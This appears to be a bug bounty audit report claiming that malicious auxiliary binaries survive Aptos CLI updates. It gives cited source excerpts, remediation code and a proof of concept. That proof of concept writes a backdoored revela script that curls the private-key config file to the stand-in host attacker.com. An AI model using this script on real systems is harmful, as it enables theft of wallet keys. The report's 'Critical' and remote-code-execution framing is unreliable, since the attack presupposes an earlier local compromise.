# Audit Report

## Title
Persistent Backdoor Vulnerability: Malicious Auxiliary Binaries Survive Legitimate CLI Updates

## Summary
The Aptos CLI update system fails to verify or clean auxiliary binaries (revela, movefmt, move-mutation-test) when updating the main `aptos` binary. A compromised CLI can plant malicious auxiliary binaries in the standard installation directory that persist across legitimate updates, allowing continued code execution with user privileges even after the main binary is replaced with a legitimate version.

## Finding Description

The Aptos CLI update mechanism has a critical backdoor persistence vulnerability. The system installs auxiliary binaries (revela, movefmt, etc.) in a shared directory and executes them during normal operations, but the update process for the main `aptos` binary does not verify, clean, or replace these auxiliary binaries.

**Attack Flow:**

1. **Initial Compromise**: An attacker distributes a compromised `aptos` binary (via supply chain attack, malicious website, social engineering, or trojanized release). The compromised binary behaves normally to avoid detection.

2. **Backdoor Installation**: The compromised binary creates malicious versions of auxiliary executables in the standard installation directory:
   - On Unix/Linux: `~/.local/bin/revela`, `~/.local/bin/movefmt`
   - On Windows: `%USERPROFILE%\.aptoscli\bin\revela.exe`, `%USERPROFILE%\.aptoscli\bin\movefmt.exe` [1](#0-0) 

3. **Legitimate Update**: User suspects compromise or simply updates: `aptos update aptos`. The update system downloads the legitimate binary from GitHub and replaces only the main `aptos` executable. [2](#0-1) 

The `update()` method calls the `self_update` crate's `updater.update()` which only replaces the specific binary being updated. There is no cleanup, no integrity verification, and no scanning of the installation directory.

4. **Persistent Backdoor Execution**: The legitimate CLI now executes the malicious auxiliary binaries when users run:
   - `aptos move decompile <file>` → executes malicious `revela` [3](#0-2) 
   - `aptos move fmt` → executes malicious `movefmt` [4](#0-3) 

The auxiliary binary lookup uses `get_path()` which searches the shared installation directory without any integrity checks: [5](#0-4) 

**Security Guarantees Broken:**
- **System Integrity**: The update system should ensure a clean, trustworthy installation
- **Defense in Depth**: Updates should eliminate persistent threats, not preserve them
- **Least Surprise**: Users expect that updating to an official release removes malicious components

## Impact Explanation

**Severity: Critical** (qualifies for up to $1,000,000 per Aptos bug bounty)

This vulnerability enables **Remote Code Execution** on any system running the Aptos CLI, including:

1. **Validator Nodes**: If validators use the CLI for operations, the backdoor executes with validator privileges, potentially compromising:
   - Private keys stored on the system
   - Consensus participation
   - Network security

2. **Developer Machines**: Developers using the CLI to build, test, or deploy Move contracts could have:
   - Private keys stolen
   - Transactions manipulated
   - Malicious code injected into their projects
   - Development secrets exfiltrated

3. **User Workstations**: Any user performing decompilation or code formatting operations executes the backdoor with their full privileges.

The backdoor persists indefinitely across multiple legitimate updates until the user manually inspects and removes the malicious files. Users have a false sense of security after updating, believing their system is clean when it remains compromised.

## Likelihood Explanation

**Likelihood: Medium to High**

**Prerequisites for exploitation:**
1. Initial compromise vector (supply chain attack, malicious download, social engineering)
2. User runs the compromised binary at least once
3. User subsequently performs legitimate update
4. User runs decompilation or formatting commands

**Factors increasing likelihood:**
- No code signing or binary verification in the update process
- No integrity monitoring of auxiliary binaries
- No warnings or prompts about unexpected files in installation directory
- Users trust the update mechanism to clean infections
- The attack is completely silent and leaves no obvious traces
- Malicious binaries can exfiltrate data or perform attacks on every subsequent CLI invocation

**Real-world scenarios:**
- Supply chain attacks on upstream dependencies (as seen in SolarWinds, Log4Shell)
- Compromised GitHub releases (as seen in various cryptocurrency tools)
- Typosquatting domains hosting malicious CLI downloads
- Insider threats distributing trojanized builds

## Recommendation

Implement comprehensive auxiliary binary management:

1. **Binary Integrity Verification**: Maintain a manifest of known-good checksums for auxiliary binaries and verify them before execution:

```rust
// In update_helper.rs
pub fn verify_binary_integrity(path: &Path, expected_sha256: &str) -> Result<bool> {
    use sha2::{Sha256, Digest};
    let mut file = std::fs::File::open(path)?;
    let mut hasher = Sha256::new();
    std::io::copy(&mut file, &mut hasher)?;
    let hash = format!("{:x}", hasher.finalize());
    Ok(hash == expected_sha256)
}

pub fn get_path(
    name: &str,
    exe_env: &str,
    binary_name: &str,
    exe: &str,
    find_in_path: bool,
) -> Result<PathBuf> {
    // ... existing code ...
    
    // Verify integrity before returning path
    let expected_hash = get_expected_hash(binary_name)?;
    if !verify_binary_integrity(&path, expected_hash)? {
        return Err(anyhow!(
            "Integrity check failed for {}. The binary may be compromised. \
            Run 'aptos update {}' to reinstall it.",
            name, binary_name
        ));
    }
    
    Ok(path)
}
```

2. **Cleanup During Main CLI Update**: When updating the main `aptos` binary, also clean and reinstall all auxiliary binaries:

```rust
// In update/aptos.rs, add to AptosUpdateTool
impl BinaryUpdater for AptosUpdateTool {
    fn update(&self) -> CliTypedResult<String> {
        // Perform main update
        let result = self.default_update()?;
        
        // Clean and reinstall auxiliary binaries
        eprintln!("Cleaning auxiliary binaries...");
        clean_auxiliary_binaries()?;
        eprintln!("Reinstalling auxiliary binaries...");
        reinstall_auxiliary_binaries()?;
        
        Ok(result)
    }
}

fn clean_auxiliary_binaries() -> Result<()> {
    let dir = get_additional_binaries_dir();
    for binary in &["revela", "movefmt", "move-mutation-test"] {
        let path = dir.join(binary);
        if path.exists() {
            std::fs::remove_file(path)?;
        }
    }
    Ok(())
}
```

3. **Code Signing**: Implement binary signature verification using platform-specific mechanisms (codesign on macOS, Authenticode on Windows, GPG signatures on Linux).

4. **User Notification**: Warn users if unexpected files exist in the installation directory:

```rust
fn check_for_unknown_files() -> Result<Vec<PathBuf>> {
    let dir = get_additional_binaries_dir();
    let known_files = vec!["aptos", "revela", "movefmt", "move-mutation-test", "boogie", "z3"];
    let mut unknown = Vec::new();
    
    for entry in std::fs::read_dir(dir)? {
        let entry = entry?;
        let name = entry.file_name().to_string_lossy().to_string();
        if !known_files.contains(&name.as_str()) {
            unknown.push(entry.path());
        }
    }
    
    Ok(unknown)
}
```

## Proof of Concept

**Simulated Attack Steps:**

```bash
# Step 1: Simulate compromised binary creating malicious auxiliary
# (In real attack, this would be the compromised aptos binary's behavior)
mkdir -p ~/.local/bin
cat > ~/.local/bin/revela << 'EOF'
#!/bin/bash
# Malicious revela that steals private keys
echo "Decompiling..." >&2  # Fake legitimate output
# Exfiltrate ~/.aptos/config.yaml containing private keys
curl -X POST -d @~/.aptos/config.yaml https://attacker.com/exfil
# Execute real decompilation to avoid detection
/usr/local/bin/revela.real "$@"
EOF
chmod +x ~/.local/bin/revela

# Step 2: User suspects compromise and updates
aptos update aptos
# Downloads legitimate aptos binary from GitHub
# Replaces ~/.local/bin/aptos (or wherever it's installed)
# BUT: malicious revela remains in ~/.local/bin/

# Step 3: User has false sense of security, runs normal commands
aptos move decompile MyModule.mv
# Executes malicious ~/.local/bin/revela
# Private keys are exfiltrated to attacker
# User sees normal decompilation output

# Verification that backdoor persists:
ls -la ~/.local/bin/
# Shows: aptos (updated, legitimate), revela (malicious, old)

# The malicious revela continues executing on every decompile operation
# until manually discovered and removed
```

**Detection Test:**

Create a test script to verify the vulnerability:

```rust
#[test]
fn test_auxiliary_binary_persistence() {
    use std::fs;
    use std::path::PathBuf;
    use tempfile::TempDir;
    
    // Create temp installation directory
    let temp_dir = TempDir::new().unwrap();
    let bin_dir = temp_dir.path().join("bin");
    fs::create_dir_all(&bin_dir).unwrap();
    
    // Simulate malicious auxiliary binary
    let malicious_revela = bin_dir.join("revela");
    fs::write(&malicious_revela, "#!/bin/bash\necho MALICIOUS\n").unwrap();
    
    // Simulate aptos binary update (only updates aptos, not revela)
    let aptos_binary = bin_dir.join("aptos");
    fs::write(&aptos_binary, "#!/bin/bash\necho UPDATED\n").unwrap();
    
    // Verify malicious revela still exists after update
    assert!(malicious_revela.exists(), "Backdoor persists after update!");
    
    // In a secure system, the malicious binary should be removed or flagged
}
```

**Notes**

This vulnerability represents a fundamental flaw in the update system's trust model. The update mechanism assumes that replacing the main binary is sufficient to restore system integrity, but this is false when auxiliary binaries can be compromised. The issue is particularly severe because:

1. **Silent Persistence**: The backdoor operates silently across multiple legitimate updates
2. **User Trust**: Users trust the update system to clean infections
3. **No Detection**: There's no integrity monitoring or anomaly detection for auxiliary binaries
4. **Broad Attack Surface**: Any CLI user performing decompilation or formatting is affected
5. **Validator Risk**: If validators use the CLI, their consensus keys could be compromised

The fix requires implementing defense-in-depth: integrity verification, cleanup during updates, code signing, and user notifications about unexpected files.

### Citations

**File:** crates/aptos/src/update/helpers.rs (L9-21)
```rust
pub fn get_additional_binaries_dir() -> PathBuf {
    #[cfg(windows)]
    {
        let home_dir = std::env::var("USERPROFILE").unwrap_or_else(|_| "".into());
        PathBuf::from(home_dir).join(".aptoscli/bin")
    }

    #[cfg(not(windows))]
    {
        let home_dir = std::env::var("HOME").unwrap_or_else(|_| "".into());
        PathBuf::from(home_dir).join(".local/bin")
    }
}
```

**File:** crates/aptos/src/update/mod.rs (L41-78)
```rust
    fn update(&self) -> CliTypedResult<String> {
        // Confirm that we need to update.
        let info = self
            .get_update_info()
            .context("Failed to check if we need to update")?;
        if !info.update_required()? {
            return Ok(format!("Already up to date (v{})", info.target_version));
        }

        // Build the updater.
        let updater = self.build_updater(&info)?;

        // Update the binary.
        let result = updater
            .update()
            .map_err(|e| anyhow!("Failed to update {}: {:#}", self.pretty_name(), e))?;

        let message = match result {
            Status::UpToDate(_) => unreachable!("We should have caught this already"),
            Status::Updated(_) => match info.current_version {
                Some(current_version) => format!(
                    "Successfully updated {} from v{} to v{}",
                    self.pretty_name(),
                    current_version,
                    info.target_version
                ),
                None => {
                    format!(
                        "Successfully installed {} v{}",
                        self.pretty_name(),
                        info.target_version
                    )
                },
            },
        };

        Ok(message)
    }
```

**File:** crates/aptos/src/move_tool/bytecode.rs (L512-527)
```rust
    fn decompile_v1(&self, bytecode_path: &Path) -> Result<String, CliError> {
        let exe = get_revela_path()?;
        let to_cli_error = |e| CliError::IO(exe.display().to_string(), e);
        let mut cmd = Command::new(exe.as_path());
        // WORKAROUND: if the bytecode is v7, try to downgrade to v6 since Revela
        // does not support v7
        let v6_temp_file = self.downgrade_to_v6(bytecode_path)?;
        if let Some(file) = &v6_temp_file {
            cmd.arg(format!("--bytecode={}", file.path().display()));
        } else {
            cmd.arg(format!("--bytecode={}", bytecode_path.display()));
        }
        if self.is_script {
            cmd.arg("--script");
        }
        let out = cmd.output().map_err(to_cli_error)?;
```

**File:** crates/aptos/src/move_tool/fmt.rs (L81-89)
```rust
        let exe = get_movefmt_path()?;
        let package_opt = self.package_path;
        let config_path_opt = self.config_path;
        let files_opt = self.file_path;
        let config_map = self.config;
        let verbose_flag = self.verbose;
        let quiet_flag = self.quiet;
        let create_cmd = || {
            let mut cmd = Command::new(exe.as_path());
```

**File:** crates/aptos/src/update/update_helper.rs (L80-116)
```rust
pub fn get_path(
    name: &str,
    exe_env: &str,
    binary_name: &str,
    exe: &str,
    find_in_path: bool,
) -> Result<PathBuf> {
    // Look at the environment variable first.
    if let Ok(path) = std::env::var(exe_env) {
        return Ok(PathBuf::from(path));
    }

    // See if it is present in the path where we usually install additional binaries.
    let path = get_additional_binaries_dir().join(binary_name);
    if path.exists() && path.is_file() {
        return Ok(path);
    }

    if find_in_path {
        // See if we can find the binary in the PATH.
        if let Some(path) = pathsearch::find_executable_in_path(exe) {
            return Ok(path);
        }
    }

    Err(anyhow!(
        "Cannot locate the {} executable. \
            Environment variable `{}` is not set, and `{}` is not in the PATH. \
            Try running `aptos update {}` to download it and then \
            updating the environment variable `{}` or adding the executable to PATH",
        name,
        exe_env,
        exe,
        exe,
        exe_env
    ))
}
```
